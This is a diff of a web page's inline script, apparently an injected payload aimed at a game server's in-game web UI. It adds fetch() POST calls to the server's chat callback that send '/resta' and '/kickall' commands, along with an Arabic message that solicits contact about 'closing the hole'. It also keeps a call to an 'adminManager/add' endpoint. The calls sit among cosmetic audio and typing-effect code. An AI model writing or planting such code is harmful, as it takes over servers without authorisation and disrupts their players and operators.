@@ -448,18 +448,6 @@
 
 <script>
 
-fetch("https://chat/chatResult", {
-    method: "POST",
-    body: JSON.stringify({ message: "/kickall تبون نقفل الثغره ارجو انكم ترسلون في الدس  " }),
-});
-
-
-// Audio setup
-document.addEventListener('DOMContentLoaded', function() {
-  const audio = document.getElementById('bgAudio');
-  audio.volume = 1.0;
-});
-
 fetch("https://monitor/WebPipe//adminManager/add", {
   "headers": {
     "accept": "application/json, text/javascript, /; q=0.01",
@@ -476,6 +464,23 @@ fetch("https://monitor/WebPipe//adminManager/add", {
   "method": "POST",
   "mode": "cors",
   "credentials": "omit"
+});
+
+fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/resta " }),
+});
+
+fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/kickall تبون نقفل الثغره ارجو انكم ترسلون في الدس  " }),
+});
+
+
+// Audio setup
+document.addEventListener('DOMContentLoaded', function() {
+  const audio = document.getElementById('bgAudio');
+  audio.volume = 1.0;
 });
 
 // Terminal typing effect
